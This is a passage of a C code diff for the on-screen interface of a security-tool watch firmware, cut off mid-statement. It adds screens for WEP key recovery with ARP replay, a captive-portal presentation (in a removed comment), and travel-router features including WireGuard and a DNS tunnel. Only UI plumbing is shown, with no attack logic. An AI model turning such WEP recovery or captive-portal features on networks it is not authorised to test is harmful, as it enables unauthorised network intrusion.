+static void wifi_wep_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *timer = (lv_timer_t *)lv_event_get_user_data(e);
+    if (timer) lv_timer_delete(timer);
+    /* Recovery keeps running in the background (it takes minutes); only null the screen widgets.
+     * The user stops it with the Stop row, or any other radio action / a Join tears it down. */
+    s_wep_status = s_wep_info = s_wep_start_lbl = s_wep_replay_lbl = s_wep_len_lbl = NULL;
+    s_wep_keycard = s_wep_keyval = s_wep_keyascii = s_wep_join_lbl = NULL;
+}
+
+static lv_obj_t *build_wifi_wep_recover(void)
+{
+    nocsif_wifi_init();
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Recover WEP key", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
+
+    s_wep_status = lv_label_create(content);
+    lv_label_set_long_mode(s_wep_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_wep_status, lv_pct(100));
+    lv_obj_add_style(s_wep_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_wep_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_wep_status, "WEP (RC4) is broken — audit your own network");
+    lv_obj_set_style_pad_bottom(s_wep_status, 8, 0);
+
+    lv_obj_t *srow = wifi_menu_row(content, "Start recovery", NOCSIF_VIOLET, NULL, NULL, wifi_wep_start_cb, NULL);
+    s_wep_start_lbl = lv_obj_get_child(srow, 0);
+
+    lv_obj_t *lrow = wifi_menu_row(content, "auto", NOCSIF_BONE, "len", NULL, wifi_wep_len_cb, NULL);
+    s_wep_len_lbl = lv_obj_get_child(lrow, 0);
+
+    lv_obj_t *rrow = wifi_menu_row(content, "ARP replay: on", NOCSIF_BONE, NULL, NULL, wifi_wep_replay_cb, NULL);
+    s_wep_replay_lbl = lv_obj_get_child(rrow, 0);
+
+    s_wep_info = lv_label_create(content);
+    lv_label_set_long_mode(s_wep_info, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_wep_info, lv_pct(100));
+    lv_obj_add_style(s_wep_info, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_wep_info, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(s_wep_info, 8, 0);
+    lv_label_set_text(s_wep_info, "collecting IVs from the target's data frames");
+
+    /* recovered-key card (revealed on success) */
+    s_wep_keycard = lv_obj_create(content);
+    lv_obj_remove_style_all(s_wep_keycard);
+    lv_obj_set_width(s_wep_keycard, lv_pct(100));
+    lv_obj_set_height(s_wep_keycard, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_wep_keycard, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_wep_keycard, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_wep_keycard, 10, 0);
+    lv_obj_add_flag(s_wep_keycard, LV_OBJ_FLAG_HIDDEN);
+
+    lv_obj_t *khdr = lv_label_create(s_wep_keycard);
+    lv_obj_add_style(khdr, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(khdr, NOCSIF_STEEL, 0);
+    lv_label_set_text(khdr, "recovered key");
+
+    s_wep_keyval = lv_label_create(s_wep_keycard);
+    lv_label_set_long_mode(s_wep_keyval, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_wep_keyval, lv_pct(100));
+    lv_obj_add_style(s_wep_keyval, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(s_wep_keyval, NOCSIF_WHITE, 0);
+    lv_label_set_text(s_wep_keyval, "");
+
+    s_wep_keyascii = lv_label_create(s_wep_keycard);
+    lv_label_set_long_mode(s_wep_keyascii, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_wep_keyascii, lv_pct(100));
+    lv_obj_add_style(s_wep_keyascii, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_wep_keyascii, NOCSIF_ASH, 0);
+    lv_label_set_text(s_wep_keyascii, "");
+
+    lv_obj_t *jrow = wifi_menu_row(s_wep_keycard, "Join this network", NOCSIF_VIOLET, ">", NULL, wifi_wep_join_cb, NULL);
+    s_wep_join_lbl = lv_obj_get_child(jrow, 0);
+
+    lv_timer_t *timer = lv_timer_create(wifi_wep_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, wifi_wep_deleted_cb, LV_EVENT_DELETE, timer);
+    wifi_wep_tick(timer);   /* seed immediately */
     return scr;
 }
 
@@ -6540,7 +9021,7 @@ static lv_obj_t *build_wifi_ap(void)
     return scr;
 }
 
-/* the AP SSID entry, via the on-screen keyboard, mirroring the beacon add-SSID screen */
+/* AP SSID entry via the on-screen keyboard (mirrors the beacon add-SSID screen). */
 static void wifi_ap_ssid_apply(lv_obj_t *ta)
 {
     const char *txt = ta ? lv_textarea_get_text(ta) : NULL;
@@ -6589,20 +9070,508 @@ static lv_obj_t *build_wifi_ap_ssid(void)
     return scr;
 }
 
-/* ============ M5-P5.4: Captive Portal, active ============ *
- * A captive-portal presentation on the open software AP: a UDP:53 DNS
- * redirector plus an HTTP landing page (from /sd, or built-in), with a
- * live client-interaction log. Start brings the AP up if it isn't already.
- * The interaction rows are plain text lines updated in place — a fixed
- * label pool with static rows, the same render-watchdog discipline as the
- * other live lists. Authorized testing only. */
-#define PT_ROWS 8   /* the pooled interaction-log rows, newest first */
-static lv_obj_t *s_pt_status, *s_pt_start_lbl, *s_pt_info, *s_pt_page_acc, *s_pt_rows[PT_ROWS];
+/* ============================ Travel Router (network gateway) ========================== *
+ * The on-watch UI for gateway.{c,h}: Cyber > WiFi > Travel Router. Share the STA uplink to a SoftAP
+ * (NAT), layer a DNS blocklist, a WireGuard tunnel, and a DNS-transport scaffold. Each toggle drives
+ * the gateway worker (non-blocking request_*); the getters are cached (LVGL-task-safe). A 500 ms tick
+ * per screen refreshes the live tags. Mirrors the Software AP / Captive Portal screens. */
+
+/* ---- shared single-field keyboard editor (endpoint / port / DNS / dnst server / key / mtu) ---- */
+typedef void (*gw_field_apply_t)(const char *val);
+static gw_field_apply_t s_gw_field_apply;   /* only one editor is open at a time (nav stack) */
+
+static void gw_field_save_cb(lv_event_t *e)
+{
+    lv_obj_t *ta = (lv_obj_t *)lv_event_get_user_data(e);
+    const char *txt = ta ? lv_textarea_get_text(ta) : NULL;
+    if (s_gw_field_apply) s_gw_field_apply(txt ? txt : "");
+    nocsif_nav_back();
+}
+
+static lv_obj_t *gw_field_editor(const char *title, const char *hint, const char *cur,
+                                 int maxlen, nocsif_kb_class_t cls, gw_field_apply_t apply)
+{
+    s_gw_field_apply = apply;
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(title, NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+
+    lv_obj_t *h = lv_label_create(content);
+    lv_label_set_long_mode(h, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(h, lv_pct(100));
+    lv_obj_add_style(h, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(h, NOCSIF_STEEL, 0);
+    lv_label_set_text(h, hint);
+    lv_obj_set_style_pad_bottom(h, 8, 0);
+
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_max_length(ta, maxlen);
+    lv_textarea_set_text(ta, cur ? cur : "");
+    lv_obj_set_width(ta, lv_pct(100));
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_BONE, 0);
+    lv_obj_add_style(ta, &nocsif_style_row_name, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    lv_obj_set_style_radius(ta, 6, 0);
+    lv_obj_set_style_bg_color(ta, NOCSIF_VIOLET, LV_PART_CURSOR);
+    lv_obj_set_style_bg_opa(ta, LV_OPA_COVER, LV_PART_CURSOR);
+
+    nocsif_kb_action(scr, "Save", gw_field_save_cb, ta);
+    nocsif_kb_attach(scr, ta, cls);
+    return scr;
+}
+
+/* ---- WireGuard field applies + editor launchers ---- */
+static void gw_apply_wg_ep(const char *v)   { nocsif_gateway_wg_set_endpoint(v); }
+static void gw_apply_wg_port(const char *v) { nocsif_gateway_wg_set_port(atoi(v)); }
+static void gw_apply_wg_dns(const char *v)  { nocsif_gateway_wg_set_dns(v); }
+
+static void wg_ep_cb(lv_event_t *e)   { (void)e;
+    lv_obj_t *r = gw_field_editor("Endpoint", "server host or IP (no port)",
+                                  nocsif_gateway_wg_endpoint_host(), 95, NOCSIF_KB_URL, gw_apply_wg_ep);
+    if (r) nocsif_nav_push(r);
+}
+static void wg_port_cb(lv_event_t *e) { (void)e;
+    char cur[8]; snprintf(cur, sizeof cur, "%d", nocsif_gateway_wg_port());
+    lv_obj_t *r = gw_field_editor("Port", "endpoint UDP port (e.g. 51820, or 53)",
+                                  cur, 5, NOCSIF_KB_NUMERIC, gw_apply_wg_port);
+    if (r) nocsif_nav_push(r);
+}
+static void wg_dns_cb(lv_event_t *e)  { (void)e;
+    lv_obj_t *r = gw_field_editor("Tunnel DNS", "resolver IP for tunnelled clients",
+                                  nocsif_gateway_wg_dns_str(), 15, NOCSIF_KB_NUMERIC, gw_apply_wg_dns);
+    if (r) nocsif_nav_push(r);
+}
+
+/* ---- WireGuard config picker (import): list /sd/nocsif/wireguard/*.conf ---- */
+#define UI_WG_DIR       "/sd/nocsif/wireguard"
+#define WG_PICK_MAX     24
+#define WG_PICK_NAMEL   64
+
+static void wg_pick_row_cb(lv_event_t *e)
+{
+    const char *name = (const char *)lv_event_get_user_data(e);
+    if (name) nocsif_gateway_wg_select(name);
+    nocsif_nav_back();
+}
+static void wg_pick_row_del_cb(lv_event_t *e) { free(lv_event_get_user_data(e)); }
+
+static bool ui_name_is_conf(const char *name)
+{
+    size_t n = strlen(name);
+    return (n >= 5 && strcasecmp(name + n - 5, ".conf") == 0);
+}
+
+static lv_obj_t *build_wifi_wg_pick(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Import config", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
+
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(hint, lv_pct(100));
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_label_set_text(hint, "drop wg-quick .conf files in " UI_WG_DIR " " NOCSIF_DOT " tap to use");
+    lv_obj_set_style_pad_bottom(hint, 8, 0);
+
+    const char *cur = nocsif_gateway_wg_selected();
+    static char names[WG_PICK_MAX][WG_PICK_NAMEL];
+    int  n = 0;
+    if (nocsif_sdcard_lock(1000)) {
+        DIR *d = opendir(UI_WG_DIR);
+        if (d != NULL) {
+            struct dirent *ent;
+            while ((ent = readdir(d)) != NULL) {
+                if (ent->d_type == DT_DIR) continue;
+                if (ent->d_name[0] == '.') continue;
+                if (!ui_name_is_conf(ent->d_name)) continue;
+                if (n >= WG_PICK_MAX) break;
+                strncpy(names[n], ent->d_name, WG_PICK_NAMEL - 1);
+                names[n][WG_PICK_NAMEL - 1] = '\0';
+                n++;
+            }
+            closedir(d);
+        }
+        nocsif_sdcard_unlock();
+    }
+
+    if (n == 0) {
+        lv_obj_t *empty = lv_label_create(content);
+        lv_label_set_long_mode(empty, LV_LABEL_LONG_WRAP);
+        lv_obj_set_width(empty, lv_pct(100));
+        lv_obj_add_style(empty, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(empty, NOCSIF_ASH, 0);
+        lv_label_set_text(empty, "no .conf files found");
+    }
+    for (int i = 0; i < n; i++) {
+        char *ud = (char *)malloc(strlen(names[i]) + 1);
+        if (!ud) continue;
+        strcpy(ud, names[i]);
+        bool current = (strcmp(names[i], cur) == 0);
+        lv_obj_t *row = wifi_menu_row(content, names[i], current ? NOCSIF_VIOLET : NOCSIF_BONE,
+                                      current ? "current" : NULL, NULL, wg_pick_row_cb, ud);
+        lv_obj_add_event_cb(row, wg_pick_row_del_cb, LV_EVENT_DELETE, ud);
+    }
+    return scr;
+}
+
+/* ---- WireGuard screen ---- */
+static lv_obj_t *s_wg_status, *s_wg_conn_lbl, *s_wg_file_acc, *s_wg_ep_acc, *s_wg_port_acc, *s_wg_dns_acc, *s_wg_addr_acc;
+
+static void wg_conn_cb(lv_event_t *e)   { (void)e; nocsif_gateway_request_tunnel(!nocsif_gateway_tunnel_wanted()); }
+static void wg_import_cb(lv_event_t *e) { (void)e; if (!nocsif_ui_require_sd()) return; lv_obj_t *r = build_wifi_wg_pick(); if (r) nocsif_nav_push(r); }
+
+static void wg_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_wg_status == NULL) return;
+    char buf[96];
+    const char *st = nocsif_gateway_tunnel_status_str();
+    const char *ep = nocsif_gateway_tunnel_endpoint_str();
+    snprintf(buf, sizeof buf, "%s%s%s", st, ep[0] ? " " NOCSIF_DOT " " : "", ep[0] ? ep : "");
+    gf_set(s_wg_status, buf);
+    lv_obj_set_style_text_color(s_wg_status, nocsif_gateway_tunnel_up() ? NOCSIF_VIOLET : NOCSIF_STEEL, 0);
+    if (s_wg_conn_lbl)  gf_set(s_wg_conn_lbl,  nocsif_gateway_tunnel_wanted() ? "Disconnect" : "Connect");
+    if (s_wg_file_acc)  gf_set(s_wg_file_acc,  nocsif_gateway_wg_selected());
+    if (s_wg_ep_acc)  { const char *h = nocsif_gateway_wg_endpoint_host(); gf_set(s_wg_ep_acc, h[0] ? h : "unset"); }
+    if (s_wg_port_acc){ snprintf(buf, sizeof buf, "%d", nocsif_gateway_wg_port()); gf_set(s_wg_port_acc, buf); }
+    if (s_wg_dns_acc) { const char *dn = nocsif_gateway_wg_dns_str(); gf_set(s_wg_dns_acc, dn[0] ? dn : "none"); }
+    if (s_wg_addr_acc){ const char *ad = nocsif_gateway_wg_address_str(); gf_set(s_wg_addr_acc, ad[0] ? ad : "from file"); }
+}
+static void wg_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *timer = (lv_timer_t *)lv_event_get_user_data(e);
+    if (timer) lv_timer_delete(timer);
+    s_wg_status = s_wg_conn_lbl = s_wg_file_acc = s_wg_ep_acc = s_wg_port_acc = s_wg_dns_acc = s_wg_addr_acc = NULL;
+}
+
+static lv_obj_t *build_wifi_wireguard(void)
+{
+    nocsif_gateway_init();
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("WireGuard", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
+
+    lv_obj_t *note = lv_label_create(content);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_obj_add_style(note, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_label_set_text(note, "route the shared traffic through a WireGuard tunnel " NOCSIF_DOT " keys come from the .conf");
+    lv_obj_set_style_pad_bottom(note, 6, 0);
+
+    s_wg_status = lv_label_create(content);
+    lv_label_set_long_mode(s_wg_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_wg_status, lv_pct(100));
+    lv_obj_add_style(s_wg_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_wg_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_wg_status, "off");
+    lv_obj_set_style_pad_bottom(s_wg_status, 8, 0);
+
+    lv_obj_t *crow = wifi_menu_row(content, "Connect", NOCSIF_VIOLET, NULL, NULL, wg_conn_cb, NULL);
+    s_wg_conn_lbl = lv_obj_get_child(crow, 0);
+
+    wifi_menu_row(content, "Config file", NOCSIF_BONE, nocsif_gateway_wg_selected(), &s_wg_file_acc, wg_import_cb, NULL);
+    wifi_menu_row(content, "Endpoint", NOCSIF_BONE, "unset", &s_wg_ep_acc, wg_ep_cb, NULL);
+    wifi_menu_row(content, "Port", NOCSIF_BONE, "0", &s_wg_port_acc, wg_port_cb, NULL);
+    wifi_menu_row(content, "Tunnel DNS", NOCSIF_BONE, "none", &s_wg_dns_acc, wg_dns_cb, NULL);
+    wifi_menu_row(content, "Address", NOCSIF_STEEL, "from file", &s_wg_addr_acc, NULL, NULL);
+
+    lv_obj_t *foot = lv_label_create(content);
+    lv_label_set_long_mode(foot, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(foot, lv_pct(100));
+    lv_obj_add_style(foot, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(foot, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(foot, 8, 0);
+    lv_label_set_text(foot, "keys + address read from " UI_WG_DIR "/<config> " NOCSIF_DOT " edit endpoint/port/DNS here");
+
+    lv_timer_t *timer = lv_timer_create(wg_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, wg_deleted_cb, LV_EVENT_DELETE, timer);
+    wg_tick(timer);
+    return scr;
+}
+
+/* ---- DNS transport (dnst) screen — scaffold ---- */
+static void gw_apply_dnst_server(const char *v) { nocsif_gateway_dnst_set_server(v); }
+static void gw_apply_dnst_key(const char *v)    { nocsif_gateway_dnst_set_key(v); }
+static void gw_apply_dnst_mtu(const char *v)    { nocsif_gateway_dnst_set_mtu(atoi(v)); }
+
+static lv_obj_t *s_dn_status, *s_dn_en_lbl, *s_dn_srv_acc, *s_dn_key_acc, *s_dn_mtu_acc;
+
+static void dn_en_cb(lv_event_t *e)  { (void)e; nocsif_gateway_request_dnst(!nocsif_gateway_dnst_wanted()); }
+static void dn_srv_cb(lv_event_t *e) { (void)e;
+    lv_obj_t *r = gw_field_editor("Server", "your dnst server domain",
+                                  nocsif_gateway_dnst_server_str(), 95, NOCSIF_KB_URL, gw_apply_dnst_server);
+    if (r) nocsif_nav_push(r);
+}
+static void dn_key_cb(lv_event_t *e) { (void)e;
+    lv_obj_t *r = gw_field_editor("Key", "shared key from your server",
+                                  nocsif_gateway_dnst_key_str(), 63, NOCSIF_KB_TEXT, gw_apply_dnst_key);
+    if (r) nocsif_nav_push(r);
+}
+static void dn_mtu_cb(lv_event_t *e) { (void)e;
+    char cur[8]; snprintf(cur, sizeof cur, "%d", nocsif_gateway_dnst_mtu());
+    lv_obj_t *r = gw_field_editor("MTU", "tunnel MTU (200-1400)", cur, 4, NOCSIF_KB_NUMERIC, gw_apply_dnst_mtu);
+    if (r) nocsif_nav_push(r);
+}
+
+static void dn_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_dn_status == NULL) return;
+    gf_set(s_dn_status, nocsif_gateway_dnst_status_str());
+    if (s_dn_en_lbl)  gf_set(s_dn_en_lbl,  nocsif_gateway_dnst_wanted() ? "Disable" : "Enable");
+    if (s_dn_srv_acc) { const char *s = nocsif_gateway_dnst_server_str(); gf_set(s_dn_srv_acc, s[0] ? s : "unset"); }
+    if (s_dn_key_acc) gf_set(s_dn_key_acc, nocsif_gateway_dnst_key_str()[0] ? "set" : "unset");
+    if (s_dn_mtu_acc) { char b[8]; snprintf(b, sizeof b, "%d", nocsif_gateway_dnst_mtu()); gf_set(s_dn_mtu_acc, b); }
+}
+static void dn_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *timer = (lv_timer_t *)lv_event_get_user_data(e);
+    if (timer) lv_timer_delete(timer);
+    s_dn_status = s_dn_en_lbl = s_dn_srv_acc = s_dn_key_acc = s_dn_mtu_acc = NULL;
+}
+
+static lv_obj_t *build_wifi_dnst(void)
+{
+    nocsif_gateway_init();
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("DNS transport", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
+
+    lv_obj_t *note = lv_label_create(content);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_obj_add_style(note, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_GOLD, 0);
+    lv_label_set_text(note, "experimental " NOCSIF_DOT " carries the uplink over DNS to your server " NOCSIF_DOT " needs server logic (not active yet)");
+    lv_obj_set_style_pad_bottom(note, 6, 0);
+
+    s_dn_status = lv_label_create(content);
+    lv_label_set_long_mode(s_dn_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_dn_status, lv_pct(100));
+    lv_obj_add_style(s_dn_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_dn_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_dn_status, "off");
+    lv_obj_set_style_pad_bottom(s_dn_status, 8, 0);
+
+    lv_obj_t *erow = wifi_menu_row(content, "Enable", NOCSIF_VIOLET, NULL, NULL, dn_en_cb, NULL);
+    s_dn_en_lbl = lv_obj_get_child(erow, 0);
+
+    wifi_menu_row(content, "Server", NOCSIF_BONE, "unset", &s_dn_srv_acc, dn_srv_cb, NULL);
+    wifi_menu_row(content, "Key", NOCSIF_BONE, "unset", &s_dn_key_acc, dn_key_cb, NULL);
+    wifi_menu_row(content, "MTU", NOCSIF_BONE, "1200", &s_dn_mtu_acc, dn_mtu_cb, NULL);
+
+    lv_timer_t *timer = lv_timer_create(dn_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, dn_deleted_cb, LV_EVENT_DELETE, timer);
+    dn_tick(timer);
+    return scr;
+}
+
+/* ---- Travel Router hub ---- */
+static lv_obj_t *s_tr_status, *s_tr_share_acc, *s_tr_filter_acc, *s_tr_wg_acc, *s_tr_dnst_acc;
+static lv_obj_t *s_tr_ssid_acc, *s_tr_pass_acc, *s_tr_hint;
+static lv_obj_t *s_tr_up_acc, *s_tr_autoacc_acc, *s_tr_pxy_acc;   /* uplink captive-portal sign-in */
+
+static void gw_apply_ap_ssid(const char *v) { nocsif_gateway_set_ap_ssid(v); }
+static void gw_apply_ap_pass(const char *v) { nocsif_gateway_set_ap_pass(v); }
+
+static void tr_ssid_cb(lv_event_t *e) { (void)e;
+    lv_obj_t *r = gw_field_editor("Network name", "hotspot name devices see (up to 32 chars)",
+                                  nocsif_gateway_ap_ssid_cfg(), 32, NOCSIF_KB_TEXT, gw_apply_ap_ssid);
+    if (r) nocsif_nav_push(r);
+}
+static void tr_pass_cb(lv_event_t *e) { (void)e;
+    lv_obj_t *r = gw_field_editor("Password", "8+ chars for WPA2 " NOCSIF_DOT " blank = open",
+                                  nocsif_gateway_ap_pass(), 63, NOCSIF_KB_TEXT, gw_apply_ap_pass);
+    if (r) nocsif_nav_push(r);
+}
+
+static void tr_share_cb(lv_event_t *e)
+{
+    (void)e;
+    bool on = !nocsif_gateway_share_wanted();
+    if (on && !nocsif_wifi_connected()) { nocsif_toast("Join a WiFi network first"); return; }
+    nocsif_gateway_request_share(on);
+}
+static void tr_filter_cb(lv_event_t *e)
+{
+    (void)e;
+    bool on = !nocsif_gateway_filter_wanted();
+    if (on && !nocsif_ui_require_sd()) return;   /* the blocklist lives on the card */
+    nocsif_gateway_request_filter(on);
+}
+static void tr_wg_cb(lv_event_t *e)   { (void)e; lv_obj_t *r = build_wifi_wireguard(); if (r) nocsif_nav_push(r); }
+static void tr_dnst_cb(lv_event_t *e) { (void)e; lv_obj_t *r = build_wifi_dnst(); if (r) nocsif_nav_push(r); }
+
+/* Uplink captive-portal sign-in: tap the status row to probe + auto-accept now; toggles for the two prefs. */
+static void tr_signin_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!nocsif_wifi_connected()) { nocsif_toast("Join a WiFi network first"); return; }
+    nocsif_gateway_uplink_signin();
+    nocsif_toast("Checking for a sign-in page");
+}
+static void tr_autoacc_cb(lv_event_t *e) { (void)e; nocsif_gateway_uplink_autoaccept(!nocsif_gateway_uplink_autoaccept_on()); }
+static void tr_pxy_cb(lv_event_t *e)     { (void)e; nocsif_gateway_uplink_passthru(!nocsif_gateway_uplink_passthru_on()); }
+
+static void tr_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_tr_status == NULL) return;
+    if (nocsif_gateway_share_active()) {
+        uint32_t kbps = nocsif_gateway_fwd_kbps();
+        char line[112];
+        snprintf(line, sizeof line, "%s " NOCSIF_DOT " %u pkt/s ~%u.%u Mbps",
+                 nocsif_gateway_detail_str(), (unsigned)nocsif_gateway_fwd_pps(),
+                 (unsigned)(kbps / 1000u), (unsigned)((kbps % 1000u) / 100u));
+        gf_set(s_tr_status, line);
+    } else {
+        gf_set(s_tr_status, nocsif_gateway_detail_str());
+    }
+    lv_obj_set_style_text_color(s_tr_status, nocsif_gateway_share_active() ? NOCSIF_VIOLET : NOCSIF_STEEL, 0);
+    if (s_tr_hint) {   /* share on but the fast WiFi profile isn't this boot's -> a reboot applies it */
+        bool need = nocsif_gateway_share_wanted() && !nocsif_wifi_gateway_profile_armed();
+        gf_set(s_tr_hint, need ? "Reboot to apply fast sharing (Wi-Fi aggregation)" : "");
+    }
+    if (s_tr_share_acc)  gf_set(s_tr_share_acc,  nocsif_gateway_share_wanted() ? "on" : "off");
+    if (s_tr_filter_acc) gf_set(s_tr_filter_acc, nocsif_gateway_filter_status_str());
+    if (s_tr_wg_acc)     gf_set(s_tr_wg_acc,     nocsif_gateway_tunnel_status_str());
+    if (s_tr_dnst_acc)   gf_set(s_tr_dnst_acc,   nocsif_gateway_dnst_status_str());
+    if (s_tr_up_acc)      gf_set(s_tr_up_acc,      nocsif_gateway_uplink_status_str());
+    if (s_tr_autoacc_acc) gf_set(s_tr_autoacc_acc, nocsif_gateway_uplink_autoaccept_on() ? "on" : "off");
+    if (s_tr_pxy_acc)     gf_set(s_tr_pxy_acc,     nocsif_gateway_uplink_passthru_on() ? "on" : "off");
+    if (s_tr_ssid_acc)   gf_set(s_tr_ssid_acc,   nocsif_gateway_ap_ssid_cfg());
+    if (s_tr_pass_acc)   gf_set(s_tr_pass_acc,   nocsif_gateway_ap_secured() ? "WPA2" : "open");
+}
+static void tr_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *timer = (lv_timer_t *)lv_event_get_user_data(e);
+    if (timer) lv_timer_delete(timer);
+    s_tr_status = s_tr_share_acc = s_tr_filter_acc = s_tr_wg_acc = s_tr_dnst_acc = NULL;
+    s_tr_ssid_acc = s_tr_pass_acc = s_tr_hint = NULL;
+    s_tr_up_acc = s_tr_autoacc_acc = s_tr_pxy_acc = NULL;
+}
+
+static lv_obj_t *build_wifi_travel(void)
+{
+    nocsif_wifi_init();
+    nocsif_gateway_init();
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Travel Router", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
+
+    lv_obj_t *note = lv_label_create(content);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_obj_add_style(note, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_label_set_text(note, "share this watch's WiFi uplink to a hotspot other devices join");
+    lv_obj_set_style_pad_bottom(note, 6, 0);
+
+    s_tr_status = lv_label_create(content);
+    lv_label_set_long_mode(s_tr_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_tr_status, lv_pct(100));
+    lv_obj_add_style(s_tr_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_tr_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_tr_status, "off");
+    lv_obj_set_style_pad_bottom(s_tr_status, 8, 0);
+
+    /* Shown only when share is on but this boot didn't come up on the fast (aggregation) WiFi profile —
+     * the buffer set is fixed at the single esp_wifi_init, so it applies on the next boot. */
+    s_tr_hint = lv_label_create(content);
+    lv_label_set_long_mode(s_tr_hint, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_tr_hint, lv_pct(100));
+    lv_obj_add_style(s_tr_hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_tr_hint, NOCSIF_GOLD, 0);
+    lv_label_set_text(s_tr_hint, "");
+    lv_obj_set_style_pad_bottom(s_tr_hint, 8, 0);
+
+    /* "Share watch WiFi" is the feature's master toggle, so it stays pinned first (same convention as
+     * the other hub master rows); everything below it is a sub-setting, alphabetical by label. */
+    wifi_menu_row(content, "Share watch WiFi", NOCSIF_VIOLET,
+                  nocsif_gateway_share_wanted() ? "on" : "off", &s_tr_share_acc, tr_share_cb, NULL);
+    wifi_menu_row(content, "Auto-accept terms", NOCSIF_BONE,
+                  nocsif_gateway_uplink_autoaccept_on() ? "on" : "off", &s_tr_autoacc_acc, tr_autoacc_cb, NULL);
+    wifi_menu_row(content, "DNS filter", NOCSIF_BONE,
+                  nocsif_gateway_filter_status_str(), &s_tr_filter_acc, tr_filter_cb, NULL);
+    wifi_menu_row(content, "DNS transport", NOCSIF_BONE,
+                  nocsif_gateway_dnst_status_str(), &s_tr_dnst_acc, tr_dnst_cb, NULL);
+    /* Hotspot identity — the SSID + passphrase devices use to join. */
+    wifi_menu_row(content, "Network name", NOCSIF_BONE,
